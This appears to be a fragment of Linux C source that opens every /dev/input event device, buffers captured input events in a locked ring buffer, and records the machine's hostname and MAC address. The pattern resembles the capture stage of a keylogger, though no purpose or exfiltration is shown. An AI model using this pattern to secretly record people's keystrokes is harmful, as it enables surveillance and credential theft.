int add_logged_event(LoggedEvent* evt) {
    pthread_spin_lock(&g_ring_buffer.lock);
    size_t next = (g_ring_buffer.head + sizeof(LoggedEvent)) % EVENT_BUFFER_SIZE;
    if (next == g_ring_buffer.tail) {
        pthread_spin_unlock(&g_ring_buffer.lock);
        return 0; // buffer full
    }
    memcpy(&g_ring_buffer.buffer[g_ring_buffer.head], evt, sizeof(LoggedEvent));
    g_ring_buffer.head = next;
    pthread_spin_unlock(&g_ring_buffer.lock);
    return 1;
}

int get_logged_event(LoggedEvent* evt) {
    pthread_spin_lock(&g_ring_buffer.lock);
    if (g_ring_buffer.head == g_ring_buffer.tail) {
        pthread_spin_unlock(&g_ring_buffer.lock);
        return 0; // empty
    }
    memcpy(evt, &g_ring_buffer.buffer[g_ring_buffer.tail], sizeof(LoggedEvent));
    g_ring_buffer.tail = (g_ring_buffer.tail + sizeof(LoggedEvent)) % EVENT_BUFFER_SIZE;
    pthread_spin_unlock(&g_ring_buffer.lock);
    return 1;
}

int open_input_device(const char* path) {
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        return -1;
    }
    char name[256] = "Unknown";
    if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) >= 0) {
        if (is_device_blacklisted(name)) {
            close(fd);
            return -2;
        }
    }
    return fd;
}

int is_device_blacklisted(const char* name) {
    const char* blacklist[] = {
        "Power Button", "Sleep Button", "Video Bus", "HID", "Microsoft", "Apple"
    };
    for (int i = 0; i < 6; i++) {
        if (strstr(name, blacklist[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

void scan_input_devices() {
    DIR* dir = opendir("/dev/input");
    if (!dir) return;

    struct dirent* ent;
    while ((ent = readdir(dir)) != NULL) {
        if (strncmp(ent->d_name, "event", 5) == 0) {
            char path[256];
            snprintf(path, sizeof(path), "/dev/input/%s", ent->d_name);
            int fd = open_input_device(path);
            if (fd > 0) {
                strcpy(g_devices[g_device_count].device_path, path);
                g_devices[g_device_count].event_fd = fd;
                g_devices[g_device_count].is_capturing = 1;
                g_device_count++;
            }
        }
    }
    closedir(dir);
}

void resolve_local_identity() {
    gethostname(g_hostname, sizeof(g_hostname));
    FILE* fp = popen("cat /sys/class/net/$(ip route | grep default | awk '{print $5}')/address", "r");
    if (fp) {
        fgets(g_mac, sizeof(g_mac), fp);
        g_mac[strcspn(g_mac, "\n")] = 0;
        pclose(fp);
    } else {
        strcpy(g_mac, "00:00:00:00:00:00");
    }
}

